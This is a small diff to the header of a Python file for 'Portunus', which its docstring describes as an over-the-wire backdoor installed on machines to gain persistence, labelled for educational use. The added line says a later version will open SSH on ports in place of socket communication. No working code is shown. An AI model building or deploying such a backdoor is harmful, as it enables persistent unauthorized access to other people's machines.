@@ -4,6 +4,7 @@ import getpass
 import socket
 
 """
+This version will be replaced with a version that will instead open ssh on ports instead of using socket communication 
 Portunus is a over the wire backdoor that can be installed on machines to gain persistence FOR EDUCATIONAL PURPOSES ONLY
 author:     1nv8rZim
 language:   Python 3.8
